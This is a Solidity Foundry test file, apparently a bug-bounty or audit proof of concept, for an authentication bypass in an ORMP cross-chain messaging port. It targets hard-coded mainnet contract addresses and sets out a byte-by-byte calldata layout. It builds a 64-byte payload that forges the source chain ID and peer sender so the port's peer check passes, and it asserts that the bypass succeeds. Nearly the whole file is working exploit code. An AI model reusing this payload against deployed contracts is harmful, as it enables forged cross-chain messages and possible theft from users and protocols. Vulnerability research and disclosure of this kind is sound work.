// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

interface IORMPPort {
    function recv(
        address fromDapp,
        address toDapp,
        bytes calldata message
    ) external payable;
}

/// @notice Captures whether port-layer auth was bypassed.
/// @dev    Only reachable if recv()'s require(_xmsgSender()==peer) PASSES.
///         Reading _xmsgSender() inside this fallback would return fromDapp
///         (app layer) — we do NOT do that. authPassed==true is the proof.
contract PortAuthCapture {
    bool public authPassed;

    fallback(bytes calldata) external payable returns (bytes memory) {
        authPassed = true; // executes ONLY if port-layer require() passed
        return "";
    }
}

contract ORMPPocTest is Test {
    // ── Confirmed on-chain constants ──────────────────────────────────────
    // ORMPUpgradeablePort — canonical — Etherscan verified
    address constant TARGET = 0x2cd1867fb8016f93710B6386f7f9F1D540A60812;

    // ORMP relay — ormp() storage read confirmed
    address constant RELAY  = 0x13b2211a7cA45Db2808F6dB05557ce5347e3634e;

    // peerOf(42161) — Arbitrum peer — confirmed registered on ETH Mainnet
    address constant PEER   = 0x2cd1867Fb8016f93710B6386f7f9F1D540A60812;

    // ── Payload byte-position proof ───────────────────────────────────────
    // recv() calldata layout with 64-byte message (196 bytes total):
    //
    //   [0:4]     selector       4 B
    //   [4:36]    fromDapp      32 B  (ABI-padded address — unchecked)
    //   [36:68]   toDapp        32 B  (ABI-padded address)
    //   [68:100]  msg_offset    32 B  = 0x0060
    //   [100:132] msg_length    32 B  = 0x0040 (64)
    //   [132:144] msg pad       12 B  bytes12(0)
    //   [144:176] msg chainId   32 B  bytes32(uint256(42161))  <- _fromChainId()
    //   [176:196] msg peer      20 B  bytes20(PEER)            <- _xmsgSender()
    //
    // _fromChainId() = calldataload(196-52) = calldataload(144)
    //               -> reads [144:176] = bytes32(uint256(42161)) -> 42161. FORGED.
    //
    // _xmsgSender() = shr(96, calldataload(196-20)) = shr(96, calldataload(176))
    //               -> reads [176:196] = bytes20(PEER), zero-pads to 32B
    //               -> shr(96, [PEER_20B | ZERO_12B]) = PEER. FORGED.
    //
    // require(PEER == _checkedPeerOf(42161)) -> PASSES -> AUTH BYPASSED.

    function testForge_ORMPPort() public {
        PortAuthCapture c = new PortAuthCapture();

        // 64-byte aligned payload: forges BOTH _fromChainId() AND _xmsgSender()
        bytes memory payload = bytes.concat(
            bytes12(0),                 // [0:12]  alignment pad
            bytes32(uint256(42161)),    // [12:44] -> calldataload(144) = 42161
            bytes20(PEER)              // [44:64] -> calldataload(176) shr(96) = PEER
        );

        // Alignment assertion: 64 % 32 == 0 -> ABI adds zero padding -> positions exact
        assertEq(payload.length, 64,      "payload must be 64 bytes");
        assertEq(payload.length % 32, 0, "payload must be 32-byte aligned");

        // vm.prank faithfully replicates the exact calldata the real relay delivers.
        // ORMP.send() is confirmed permissionless — real attacker uses same path.
        vm.prank(RELAY);

        (bool ok,) = TARGET.call(
            abi.encodeWithSelector(
                IORMPPort.recv.selector,
                address(0xdead), // fromDapp: arbitrary — recv() does not validate it
                address(c),      // toDapp:   PortAuthCapture
                payload
            )
        );

        // ASSERTION 1: recv() did not revert
        assertTrue(ok, "recv() reverted — check RELAY address or payload alignment");

        // ASSERTION 2: PORT-LAYER AUTH WAS BYPASSED
        // c.authPassed() is true ONLY if require(_xmsgSender()==_checkedPeerOf(42161)) PASSED.
        // This proves the 64-byte forged payload successfully impersonated the Arbitrum peer.
        assertTrue(c.authPassed(), "AUTH BYPASS FAILED — check calldata positions");

        console.log(">>> AUTH BYPASSED = CRITICAL CONFIRMED <<<");
        console.log(">>> Port-layer authentication is fully attacker-controlled <<<");
    }
}